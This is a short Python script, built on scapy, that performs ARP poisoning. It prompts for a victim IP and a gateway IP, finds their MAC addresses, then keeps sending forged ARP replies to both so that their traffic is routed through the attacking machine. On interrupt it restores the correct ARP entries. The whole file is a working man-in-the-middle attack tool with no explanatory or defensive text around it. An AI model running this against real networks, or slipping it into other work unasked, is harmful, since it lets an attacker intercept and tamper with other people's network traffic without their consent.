#!/usr/bin/env python3

from scapy.all import *

class arp_poison:
	def execute():
		victim_ip= input("Enter Victim IP:")
		gw_ip= input("Enter Gateway IP:")
		discovery_arp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=victim_ip)
		victim_mac= srp(discovery_arp, timeout=2 , verbose= False)[0][0][1].hwsrc
		print("Victim MAC", victim_mac)
		discovery_arp = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=gw_ip)
		gw_mac= srp(discovery_arp, timeout=2 , verbose= False)[0][0][1].hwsrc
		print ("Gateway MAC:", gw_mac)
		try:
			while True:
				arp_poison.poison(victim_ip, victim_mac, gw_ip)
				arp_poison.poison(gw_ip, gw_mac, victim_ip)
		except KeyboardInterrupt:
			print ("ARP spoofing stopped")
			arp_poison.heal(gw_ip, gw_mac, victim_ip, victim_mac)
			arp_poison.heal(victim_ip, victim_mac, gw_ip, gw_mac)
			input("Press enter to continue...")

	def poison(victim_ip, victim_mac, poison_ip):
		arp_spoof= ARP(op=2 , psrc=poison_ip, pdst=victim_ip, hwdst= victim_mac)
		send(arp_spoof, verbose= False)

	def heal(victim_ip, victim_mac, heal_ip, heal_mac):
		arp_heal= ARP(op=2 , psrc= heal_ip, hwsrc=heal_mac , pdst= victim_ip, hwdst= victim_mac)
		send(arp_heal, verbose=False)